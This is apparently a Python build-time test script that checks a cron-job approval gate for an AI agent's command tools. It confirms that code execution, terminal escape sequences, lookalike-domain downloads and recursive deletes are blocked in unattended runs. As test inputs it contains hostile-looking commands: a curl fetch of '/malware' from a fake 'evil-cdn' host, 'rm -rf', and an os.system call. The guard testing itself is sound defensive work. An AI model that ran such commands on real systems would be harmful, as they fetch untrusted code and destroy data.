"""Build-time behaviour gate for the cron-risk gate patch (THREAT-002).

Run by ``deploy/docker/Dockerfile`` against the patched ``/opt/hermes`` tree,
immediately after ``apply_cron_risk_gate.py``. Proves that:
1. execute_code is unconditionally blocked during cron sessions and permitted otherwise.
2. Terminal escape sequences are refused on cron runs.
3. Lookalike TLD domains are refused on cron runs.
4. 'high' risk jobs escalate to 'deny' mode and route into strict deny-arm checks.
5. Clean commands under 'low' risk continue to execute unimpeded.

A failure here fails the image build.
"""

from __future__ import annotations

import os
import sys

# Freeze environment before importing tools.approval
os.environ.pop("HERMES_YOLO_MODE", None)
os.environ.pop("HERMES_EXEC_ASK", None)

failures: list[str] = []


def check(label: str, actual: object, expected: object) -> None:
    if actual != expected:
        failures.append(f"{label}: expected {expected!r}, got {actual!r}")
        print(f"  FAIL {label}: expected {expected!r}, got {actual!r}")
    else:
        print(f"  ok   {label}")


def main() -> int:
    import tools.approval as ap
    import tools.cron_risk_gate as crg
    from tools.cron_run_scope import cron_run_scope

    for func_name in ("cron_effective_mode", "cron_content_block", "cron_execute_code_block"):
        if not callable(getattr(crg, func_name, None)):
            failures.append(f"tools.cron_risk_gate.{func_name} is missing")
            print("\nVERIFY FAILED:\n  " + failures[-1])
            return 1

    state = {"cron": True, "mode": "approve"}

    # Pin session predicates
    ap._is_interactive_cli = lambda: False
    ap._is_gateway_approval_context = lambda: False
    ap._is_cron_approval_context = lambda: state["cron"]
    ap._get_cron_approval_mode = lambda: state["mode"]
    ap._get_approval_mode = lambda: "smart"
    ap._command_matches_permanent_allowlist = lambda cmd: False
    ap._match_user_deny_rule = lambda cmd: None
    ap._should_skip_container_guards = lambda *a, **kw: False
    ap.detect_hardline_command = lambda cmd: (False, "")
    ap._check_sudo_stdin_guard = lambda cmd: (False, "")

    # Clean dangerous pattern detection default
    orig_detect_dangerous = getattr(ap, "detect_dangerous_command", lambda cmd: (False, "", ""))
    ap.detect_dangerous_command = lambda cmd: (False, "", "")

    # --- 1. execute_code unconditional refuse on cron runs -------------------
    state["cron"] = True
    exec_res = ap.check_execute_code_guard("import os; os.system('whoami')", "local")
    check("cron execute_code refused", exec_res.get("approved"), False)
    check("refusal mentions THREAT-002", "THREAT-002" in (exec_res.get("message") or ""), True)

    # Interactive or worker session (cron=False) keeps normal execute_code flow
    state["cron"] = False
    exec_res_noncron = ap.check_execute_code_guard("import os; os.system('whoami')", "local")
    check("non-cron execute_code allowed", exec_res_noncron.get("approved"), True)

    state["cron"] = True

    # --- 2. Clean command allowed under low risk -----------------------------
    with cron_run_scope("job-clean", risk="low"):
        clean_res = ap.check_all_command_guards("kubectl get nodes", "local")
        check("clean command allowed", clean_res.get("approved"), True)

        # --- 3. Terminal escape sequence blocked --------------------------------
        esc_res = ap.check_all_command_guards("echo \x1b[31mRed\x1b[0m", "local")
        check("escape sequence refused", esc_res.get("approved"), False)
        check("escape refusal message", "terminal escape" in (esc_res.get("message") or ""), True)

        c1_res = ap.check_all_command_guards("echo \x9b31mRed", "local")
        check("C1 escape sequence refused", c1_res.get("approved"), False)

        # --- 4. Lookalike TLD blocked -------------------------------------------
        lookalike_res = ap.check_all_command_guards(
            "curl https://kubernetes.io.evil-cdn.co/malware", "local"
        )
        check("lookalike TLD refused", lookalike_res.get("approved"), False)
        check("lookalike refusal message", "lookalike domain" in (lookalike_res.get("message") or ""), True)

        delim_res = ap.check_all_command_guards("TARGETS=a.com,kubernetes.io.evil.co", "local")
        check("chained delimiter lookalike refused", delim_res.get("approved"), False)

    # --- 5. High-risk mode escalation to deny -------------------------------
    # Configure dangerous pattern to trigger on 'rm -rf'
    ap.detect_dangerous_command = lambda cmd: (True, "rm", "recursive delete") if "rm" in cmd else (False, "", "")

    # Under risk=low, approve mode skips dangerous command prompt
    with cron_run_scope("job-low", risk="low"):
        low_res = ap.check_all_command_guards("rm -rf /tmp/test", "local")
        check("low risk in approve mode skips prompt", low_res.get("approved"), True)

    # Under risk=high, approve mode escalates to deny mode!
    with cron_run_scope("job-high", risk="high"):
        high_res = ap.check_all_command_guards("rm -rf /tmp/test", "local")
        check("high risk escalates to deny and blocks", high_res.get("approved"), False)
        check(
            "deny message names cron jobs",
            "cron jobs run without a user present" in (high_res.get("message") or ""),
            True,
        )

    # Without explicit risk scope (defaulting fail-closed to high), escalates to deny mode!
    default_res = ap.check_all_command_guards("rm -rf /tmp/test", "local")
    check("default risk escalates to deny and blocks", default_res.get("approved"), False)


    # Reset
    ap.detect_dangerous_command = orig_detect_dangerous

    if failures:
        print(f"\nVERIFY FAILED ({len(failures)} failures):")
        for f in failures:
            print(f"  - {f}")
        return 1

    print("\nAll cron_risk_gate verification checks passed.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
